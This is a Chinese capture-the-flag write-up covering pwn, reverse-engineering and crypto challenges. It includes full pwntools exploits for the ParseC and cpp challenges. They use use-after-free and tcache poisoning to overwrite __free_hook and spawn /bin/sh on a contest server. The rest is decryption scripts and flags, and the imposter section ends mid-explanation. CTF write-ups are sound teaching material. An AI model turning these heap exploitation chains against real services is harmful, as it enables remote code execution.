# X-NUCA Writeup By X1cT34m



## PWN
### ParseC
read跟write存在变量未初始化，可以直接任意位置读写，但是位置得写死，没办法去造后续的利用。
审计源码发现在对strsym跟sym这些变量赋值时候，会检测传递的值，如果是新的则会讲原本的free掉，但如果是另外一个，则是简单的将指针给copy过去。从而导致如下情况

```c
a="aaaa";
b=a;
b="vvvv";
```
会导致uaf，a指向原本的chunk，而这处chunk已经被free了。
btw,因为没有找到读入后的num如何转换为string，且并不知道如何将一个string通过交互让他可变。最终劫持选择array，且array最小为0x51的chunk大小，最后造好堆布局后，去给freehook上方写入一个0x51的堆头，并再次劫持，去相应地方分配堆块，从而获取一个fake chunk && chunk size==0x51。
文件的代码：
```c
e1="fmyy";
e2="fmyy";
e3="fmyy";
e4="fmyy";
e5="fmyy";
e6="fmyy";
e="fmyy";
array arr(1);
e1="fmyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy";
e2="fmyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy";
e3="fmyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy";
e4="fmyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy";
d=e;
d="fmyy";
m=e;
e="fmyyaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
puts(m);
d=e;
d="fmyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy";
puts(e);
read(num);
arr[0]=num;
h="h";
m="h";
l="Q";
l="Q";
l1="Q";
l2="Q";
h1=h;
h="a";
h1="fmyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy";
l3="h";
read(num2);
arr[0]=num2;
l4="/bin/sh";
l5="h";
l6="fmyy";
l6="fmyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy";
array ar(1);
read(num3);
ar[0]=num3;
read(num4);
l4="/bin/sh"
```
exp:
```python
from pwn import *
io=process('./trans')
r=remote('123.57.4.93',34007)
code='CmUxPSJmbXl5IjsKZTI9ImZteXkiOwplMz0iZm15eSI7CmU0PSJmbXl5IjsKZTU9ImZteXkiOwplNj0iZm15eSI7CmU9ImZteXkiOwphcnJheSBhcnIoMSk7CmUxPSJmbXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eSI7CmUyPSJmbXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eSI7CmUzPSJmbXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eSI7CmU0PSJmbXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eSI7CmQ9ZTsKZD0iZm15eSI7Cm09ZTsKZT0iZm15eWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhIjsKcHV0cyhtKTsKZD1lOwpkPSJmbXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXkiOwpwdXRzKGUpOwpyZWFkKG51bSk7CmFyclswXT1udW07Cmg9ImgiOwptPSJoIjsKbD0iUSI7Cmw9IlEiOwpsMT0iUSI7CmwyPSJRIjsKaDE9aDsKaD0iYSI7CmgxPSJmbXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXkiOwpsMz0iaCI7CnJlYWQobnVtMik7CmFyclswXT1udW0yOwpsND0iL2Jpbi9zaCI7Cmw1PSJoIjsKbDY9ImZteXkiOwpsNj0iZm15eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eSI7CmFycmF5IGFyKDEpOwpyZWFkKG51bTMpOwphclswXT1udW0zOwpyZWFkKG51bTQpOwpsND0iL2Jpbi9zaCIK'
r.recvuntil('-------\n')
r.sendline(code)
#r=process(['./ParseC','./code'])
libc=ELF('./libc-2.27.so')
def i2f(num):
	io.sendline('2')
	io.recvuntil('input:\n')
	io.sendline(str(num))
	return io.recvline()
def gd(cmd=''):
	gdb.attach(r,cmd)
	pause()
leak=u64(r.recv(6).ljust(8,'\x00'))
print hex(leak)
hbase =leak-0x320
print hex(hbase+0x58)
r.recvuntil('\n')
#r.recvuntil('libc :')
leak=u64(r.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
print hex(leak)
lbase=leak-96-0x10-libc.symbols['__malloc_hook']
print hex(lbase)
todo=lbase+libc.symbols['__free_hook']-0x30
r.sendline(i2f(todo))
sleep(1)
todo=lbase+libc.symbols['__free_hook']-0x28
r.sendline(i2f(todo))
sleep(1)
to=lbase+libc.symbols['system']
r.sendline(i2f(to))
r.interactive()
```

### ez_elf
远程接受base64编码后解码写到二进制流文件里面,拿到一个7z压缩包,解压后是一个ELF文件,因为是dump出来的数据,所以got表里面已经重定位了,因此手动修复重定位的跳转  
之后则是让一份程序能运行后,写脚本接受处理远程返回的数据,并用之前改好的文件的got表数据覆盖新接受的文件got表数据,并运行他拿到answer  
因为process()交互运行会卡住,所以手动运行拿到answer并提交  
```python
from pwn import*
import struct
import base64
p = remote('123.57.4.93',23334)
os.system('rm tmp')
os.system('rm tmp.7z')
p.recvuntil('Start:\n')
data = p.recvuntil('\nEnd.',drop=True)
text = base64.b64decode(data)
p.recvuntil('Start:\n')
data = p.recvuntil('\nEnd.',drop=True)
got = base64.b64decode(data)

p.recvuntil('Start:\n')
data = p.recvuntil('\nEnd.',drop=True)
bss = base64.b64decode(data)

with open ("tmp.7z","wb") as f:
	f.write(text)
	f.write('\x00'*0x1FF000)
	f.write((got.ljust(0x1000,'\x00')))
	f.write((bss.ljust(0x1000,'\x00')))
	f.close()
os.system('7z x tmp.7z')
os.system('chmod +x ./tmp')
data = ''

with open ("main","rb") as f:
	f.seek(0x617000-0x617000 + 0x1000 + 0x16000,0)
	data += f.read(0x120)
	f.close()
with open ("tmp","r+b") as t:
	t.flush()
	t.seek(0x617000-0x617000 + 0x1000 + 0x16000,1)
	t.write(data)
	t.close()
ans = raw_input('ANS')
p.sendline(ans)
p.interactive()
```
### cpp
UAF漏洞,不会C++的,所以全靠调试堆风水弄出来的,但是Delete的时候有个UAF 还是知道的,之后则是构造一个tcache poision修改一个unsorted bin chunk的数据指向_IO_2_1_stdout_,然后用另外一个已经伪造到0x40大小的块 通过tcache poision 和 stdout拿到libc_base,最后则是需要在申请0x40的块之前,Delete两次,再次利用tcache poision 攻击free_hook写入一个rce
```python
from pwn import*
def menu(ch):
	p.sendlineafter('[B]ye',ch)
def edit(content):
	menu('W')
	p.sendline(content)
libc =ELF('./libc-2.27.so')
while True:
	try:
		p = remote('123.57.4.93',12001)
#		p = process('./main')
		for i in range(3):
			menu('C')
		edit(('\x00'*8 + p64(0x21))*0x200)
		edit('\x00'*8)
		edit('\x00'*8)
		edit('\x00'*8 + '\x50\x67')
		for i in range(2):
			menu('C')
		edit('\x60')
		edit('\x00'*8)
		edit(p64(0) + p64(0x41))
		menu('C')
		menu('C')
		menu('C')
		menu('C')
		menu('D')
		menu('D')
		edit('\x70\xEE')
		edit('\x70\xEE')
		edit('\x38\xF7')
		menu('D')
		menu('D')
		edit('\x00'*0x38)
		edit('\x00'*0x38)
		edit(p64(0)*2 + p64(0xFBAD1800) + '\x00'*0x18 + '\xC8')
		libc_base = u64(p.recvuntil('\x7F',timeout=0.2)[-6:].ljust(8,'\x00')) - libc.sym['_IO_2_1_stdin_']
		if libc_base < 0x7F0000000000:
			p.close()
			continue
		log.info('LIBC:\t' + hex(libc_base))
		edit(p64(libc_base + libc.sym['__free_hook']))
		edit('/bin/sh\x00')
		edit(p64(libc_base + 0x4F3C2))
		menu('D')
		break
	except:
		p.close()
		continue
p.sendline('icq5c64b0b5c7938d08c9d1b7cb3346a')
p.interactive()
```

## re
### Unravel MFC
MFC有反调试
xspy查看发现长度为66，但是只能输入63最长，用resourcehacker修改长度
配合od ida静态分析
发现rc4 伪base64验证前33
tea验证后33
```python
# -*- coding: UTF-8 -*
a = [0x24,0x48,0x4D,0x25,0x2F,0x4E,0x45,0x58,0x2C,0x37,0x39,0x50,0x42,0x4E,0x5C,0x43,0x2F,0x42,0x51,0x4C,0x56,0x53,0x57,0x2C,0x2A,0x2F,0x27,0x38,0x54,0x23,0x55,0x4D,0x43,0x34,0x25,0x45,0x47,0x40,0x40,0x40,0x2C,0x2E,0x25,0x35]
b = [0]*33
j = 0
c = [0x21,0x49,0xD7,0x3D,0xB2,0xE5,0x3D,0x7B,0x81,0x79,0x9C,0x5E,0x3C,0xAF,0x97,0xDA,0x5C,0x27,0x22,0xE3,0x1B,0xC8,0x3D,0x82,0x85,0x29,0x9C,0xC4,0xD8,0x58,0x1A,0xB5,0x9F]
for i in range(0,len(a),4):
    b[j] = (((a[i]-0x23)<<2)|((a[i+1]-0x23)>>4))&0xff
    b[j+1] = (((a[i+1]-0x23)<<4)|((a[i+2]-0x23)>>2))&0xff
    b[j+2] = (((a[i+2]-0x23)<<6)|(a[i+3]-0x23))&0xff
    j += 3
flag = ''
print len(c)
for i in range(33):
    flag += chr(b[i]^c[i]^ord('a'))
print flag
print len('Fr4nk1y_MfC_l5_t0O_ComPIeX_4nd_dlf1cUlt_foR_THe_r0Ok1E_t0_REver5e')
```

```c
#define _CRT_SECURE_NO_DEPRECATE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <Windows.h>
#include <DbgHelp.h>

void encrypt(uint32_t* v, uint32_t* k) {
    uint32_t v0 = v[0], v1 = v[1], sum = 0, i;           /* set up */
    uint32_t delta = 0x9e3779b9;                     /* a key schedule constant */
    uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3];   /* cache key */
    for (i = 0; i < 32; i++) {                       /* basic cycle start */
        sum += delta;
        v0 += ((v1 << 4) + k0) ^ (v1 + sum) ^ ((v1 >> 5) + k1);
        v1 += ((v0 << 4) + k2) ^ (v0 + sum) ^ ((v0 >> 5) + k3);
    }                                              /* end cycle */
    v[0] = v0; v[1] = v1;
}

void decrypt(uint32_t* v, uint32_t* k) {
    uint32_t v0 = v[0], v1 = v[1], sum = 0, i;  /* set up */
    uint32_t delta = 0x2433B95A;                     /* a key schedule constant */
    uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3];   /* cache key */
    int v7 = 32;
    do {
        sum += 0x2433B95A;
        v7--;
    } while (v7);
    for (i = 0; i < 32; i++) {                         /* basic cycle start */
        v1 -= ((v0 << 4) + k2) ^ (v0 + sum) ^ ((v0 >> 5) + k3);
        v0 -= ((v1 << 4) + k0) ^ (v1 + sum) ^ ((v1 >> 5) + k1);
        sum -= delta;
    }                                              /* end cycle */
    v[0] = v0; v[1] = v1;
}
int main()
{
    uint32_t key[] = { 0x0D9610D02,0x2AADA57D,0x0A37537F1,0x0C29E3913,0x0D5942CE8,0x608CCE66,0x6D593422,0x21E5D6F2,0x0ED3A9235,0x9DAD62C4,0x3856641B,0x71F75B9D,0x0DCDEDAE8,0x0EAD2D1A0,0x0BAC4F564,0x0DA4772AC };
    int i;
    uint32_t data[] = { 0x2d46347f,0x5e79f6f4,0xDF3634AE,0x2F9970FF,0x6cacebd5,0x12c2fc6d,0xe8e95dc6,0xc558d3ec };
    for (i = 0; i < 4; i++)
    {
        decrypt(&data[2 * i], &key[4 * i]);
    }
    printf("%s", data);
    return 0;
}
```

### Exception
![](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/bRFiO2M4fKylqZA.png)

![](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/1Vmupyc6xMEYFBR.png)

veh 未处理异常
还有seh
执行顺序
先veh
然后seh俩个跑完
然后未处理异常，未处理异常调试时不会执行
最后跑另外一个veh因为函数不一样这个是再seh后
第一个seh是魔改aes
第二个是魔改base32
验证完毕回main
还有一部分验证再下图
![](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/SgpwNz6xjW9vGIa.png)
先是rc6然后明文比较一个字节
然后xor比较
pLeA5e_nEveR_UnDeRe5t1m4te_7he_heArt_Of_a_cH4mpI0n

### babyarm

一个arm逆向，hook了libc中的memcmp和tolower，调试hook后的memcmp，可以看到是类似tea的东西，跑了16轮，key是2,2,3,4，把循环里面的语录倒过来，改一下sum，得到逆运算，计算flag

## Crypto
### weird
e的取值范围为：

$$
e = \frac{y}{x} \cdot ((p+1)(q+1) \pm \frac{(p-q)\cdot N^{0.21}}{3(p+q)})
$$

两边除以$N$，可以化为：
$$
\frac{e}{N} = \frac{y}{x}(1 + \frac{p+q+1}{N} \pm \frac{(p-q)\cdot N^{0.21-1}}{3(p+q)})
$$
等式右边括号里面的内容，除了1以外，其他的一大坨实际上非常小，所以可以用连分数逼近出$x, y$

得到$x, y$后，可以再写成：
$$
\frac{ex}{y} = (p+1)(q+1) \pm \frac{(p-q)\cdot N^{0.21}}{3(p+q)}
$$
从中可以得到$(p+1)(q+1)$的近似值，进而得到$s = p + q$的近似值$s'$（大部分MSB）

再根据方程
$$
p^2 - sp + N == 0
$$
可以从$s'$中得到$p$的近似值（大部分MSB），再利用Coppersmith求small root即可得到$p$。

```python
e = 288969517294013178236187423377607850772706067194956328319540958788120421760563745859661120809993097599452236235703456953461446476016483100948287481999230043898368061651387268308645842547879026821842863879967704742559469599469159759360184157244907772315674219466971226019794131421405331578417729612598931842872757269134756215101980595515566901217084629217607502582265295755863799167702741408881294579819035951888562668951997777236828957162036234849207438819692480197365737237130918496390340939168630111890207700776894851839829623749822549994705192645373973493114436603297829506747411555800330860323339168875710029679
N = 6321130275268755691320586594611921079666212146561948694592313061609721619539590734495630218941969050343046016393977582794839173726817429324685098585960482266998399162720208269336303520478867387042992449850962809825380612709067651432344409349798118550026702892042869238047094344883994914342037831757447770321791092478847580639207346027164495372017699282907858775577530313354865815011726710796887715414931577176850854690237886239119894136091932619828539390021389626283175740389396541552356118540397518601098858527880603493380691706649684470530670258670128352699647582718206243920566184954440517665446820063779925391893

# continued fraction to get x, y
for yx in continued_fraction(e/N).convergents():
    y = yx.numerator()
    x = yx.denominator()
    if 505 < int(y).bit_length() < 512:
        print(y, x)
y = 191647030322314063933446306550000152159918198096618463122326606379318850479081854860589073369290364918610034409117430532516778779852605002825941902686890
x = 4192227114056319822897394360156470548388606366132514768963399681506785727010581839300216734934782392422359863064113714026255201119666834070559961903071641

# partial p + q   =>  partial p
FF = RealField(10000)
p1q1 = int(FF(e*x) / FF(y))  # (p+1)*(q+1) + t, 0 < |t| < 2^430
p_q = p1q1 - N - 1           # MSB of p + q

var('x')
sol = solve([x^2 - p_q*x + N == 0], [x])
print(sol)

p0 = int(2*sqrt(444482467821025143305714555098099874062257553979119449654587984340699281800173027994633689136951044849243548793156705333028767010195164948611035937158387510451319737136925831287185593903136350487308896025780715187816715278067041814405142556822075770900097258406937616064638280659257536275473948985510922869901638270771121240358810519179840326427061370935104409890106181463960493575108004043632173319301775433061901082094379630436136367612780550559235163533614514983589177092871648322832771654828255238330634284842440455106445053680715818851887524046345927284003752325161056009416047812577970302873994123319001497039) + 89994778440489847480440137769232042484935231349681875012384488554074077511548785060223148718425106134106617171828275416695240510121868575799056004416229473935531531025990820027338788037021162036854950042026290515874475009680903735739096745933824119815539107450507126377435744105357286336630442890699073670007)
print("p0:", p0)

PR.<x> = PolynomialRing(Zmod(N))

f = p0 + x
f = f.monic()
roots = f.small_roots(X=2^430, beta=0.4)
if roots:
    p = p0 + roots[0]
print(p)

# p = 132160284144608950019816194803720605665582054407890340625286428343034451279699999656554400403442321672129341860427814515935184696844617907072796285688260865300923112869612920717393389100962210593903755734372629195470923938634371604924606564978967830639867288297401137624219856087339978669043930742514051454567
```

flag拆成两部分作为一个坐标点pt，相当于对点pt数乘e得到ct，(不过是线性实现的$O(n)$，2000 years later...)。

观察key_gen()部分的实现，k是e对$(p + 1) * (q + 1)$的逆元，只给了N和e，但没给k，那么k应该就是解密用的私钥了，本地测试数据发现只要对密文ct数乘k就可以解出明文pt了。

这里还需要重新实现一下点的数乘（$O(logn)$），几秒就可以得到flag。

```python
from Crypto.Util.number import *

e, N = (288969517294013178236187423377607850772706067194956328319540958788120421760563745859661120809993097599452236235703456953461446476016483100948287481999230043898368061651387268308645842547879026821842863879967704742559469599469159759360184157244907772315674219466971226019794131421405331578417729612598931842872757269134756215101980595515566901217084629217607502582265295755863799167702741408881294579819035951888562668951997777236828957162036234849207438819692480197365737237130918496390340939168630111890207700776894851839829623749822549994705192645373973493114436603297829506747411555800330860323339168875710029679,
        6321130275268755691320586594611921079666212146561948694592313061609721619539590734495630218941969050343046016393977582794839173726817429324685098585960482266998399162720208269336303520478867387042992449850962809825380612709067651432344409349798118550026702892042869238047094344883994914342037831757447770321791092478847580639207346027164495372017699282907858775577530313354865815011726710796887715414931577176850854690237886239119894136091932619828539390021389626283175740389396541552356118540397518601098858527880603493380691706649684470530670258670128352699647582718206243920566184954440517665446820063779925391893)
ct = (5899152272551058285195694254667877221970753694584926104666866605696215068207480540407327508300257676391022109169902014292744666257465490629821382573289737174334198164333033128913955350103258256280828114875165476209826215601196920761915628274301746678705023551051091500407363159529055081261677043206130866838451325794109635288399010815200512702451748093168790121961904783034526572263126354004237323724559882241164587153748688219172626902108911587291552030335170336301818195688699255375043513696525422124055880380071075595317183172843771015029292369558240259547938684717895057447152729328016698107789678823563841271755,
      253027286530960212859400305369275200777004645361154014614791278682230897619117833798134983197915876185668102195590667437488411251835330785944874517235915807926715611143830896296709467978143690346677123639363900536537534596995622179904587739684155397043547262126131676366948937690378306959846311626889534352806134472610026603322329394769864728875293696851590640974817297099985799243285824842399573006841275494668451690794643886677303573329060084436896592291515021246248961538322485059619863786362159459122242131918702862396595818404578595841492379025543989260901540257216728185425462070297720884398220421012139424567)

def add(p1, p2):
    d = (((p2[1])**2 - 1) * inverse(((p2[1])**2 + 1) * (p2[0])**2, N)) % N
    p = (int((p1[0] * p2[1] + p1[1] * p2[0]) * inverse(1 + d * p1[0] * p2[0] * p1[1] * p2[1], N) % N),
         int((p1[1] * p2[1] + d * p1[0] * p2[0]) * inverse(1 - d * p1[0] * p2[0] * p1[1] * p2[1], N) % N))
    return p

def mul(n, p):
    r = (0, 1)
    tmp = p
    while 0 < n:
        if n & 1 == 1:
            r = add(r, tmp)
        n, tmp = n >> 1, add(tmp, tmp)
    return r

p = 132160284144608950019816194803720605665582054407890340625286428343034451279699999656554400403442321672129341860427814515935184696844617907072796285688260865300923112869612920717393389100962210593903755734372629195470923938634371604924606564978967830639867288297401137624219856087339978669043930742514051454567
q = N//p
k = inverse(e, (p + 1) * (q + 1))
pt = mul(k, ct)
print(long_to_bytes(pt[0])+long_to_bytes(pt[1]))
```

X-NUCA{Youve_Forg0tt3n_th3_t4ste_0f_Rea1_h0ney_6f36940f714710af}

hhh，居然是《闻香识女人》里的台词，有空一定去二刷。

### imposter

服务端实现了一个Encryption With Authentication功能，并提供加密和解密这两个选项。


- 加密：加密的明文有一定的格式，`"Uid=%d\xff" + "Username=%s\xff" + "T=%s\xff" + "Cmd=%s\xff" + Appendix`，允许客户端在相应位置填入数据。其中，`Uid`（最多5bytes）可以用来指定后面`T`的位数，而剩余的地方都最多只能填16bytes，而且还只能是0~127的byte（`encode("ascii")`）。加密会assemble这些内容，对其进行加密，返回密文以及对应的auth。
- 解密：会对客户端提供的cipher进行解密，还会验证客户端提供的auth是否与cipher对应。

如果解密的内容满足以下2项要求，就能getflag：
1. Username=Administrator
2. Cmd=Give_Me_Flag

但是在加密的时候，不能填入这些数据。

---

审计具体加解密流程后，可以画一张图：
![](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/Wf9zPeiFuIvtcE7.png)

想了挺久怎么去flip bit来修改明文内容，但是这个铁锁连环实在是太难日了。

那么可以这么考虑：这2个16bytes的明密文可以看作是一组32bytes的明密文，这一组就是一个很难日的东西，但是组与组之间是相互独立的，可以通过巧妙地控制组与组之间的边界，来拿到我们想要的密文。

